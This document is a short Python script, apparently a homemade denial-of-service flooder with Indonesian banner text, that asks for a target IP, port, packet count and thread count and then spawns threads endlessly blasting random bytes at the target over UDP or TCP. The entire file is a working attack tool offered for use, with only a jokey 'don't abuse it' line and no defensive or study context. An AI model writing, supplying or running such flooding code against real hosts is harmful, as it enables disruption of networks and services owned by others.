#NeonD...
import random
import socket
import threading

print('''=========== TOOLS BY NATHAN DAN NEOND ===========''')
print('''=========== YANG RENAME GW DATENGIN ===========''')
print('''=========== JANGAN ABUSE YA BEB ===========''')
print('''=========== LOPYU <3 ===========''')

ip = str(input("IP NYA NGAB:"))
port = int(input("PORT NYA NGAB:"))
times = int(input("MAU BERAPA PAKETNYA:"))
threads = int(input("JUMLAH BARANGNYA BERAPA:"))
choice = str(input("GAS GAK SIH ? (y or n):"))
def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("[+] WELLPLAYED!!!")
		except:
			print("[=] VICTORY !!!")

def run2():
	data = random._urandom(150)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[+] WELLPLAYED!!!")
		except:
			s.close()
			print("[=] VICTORY !!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
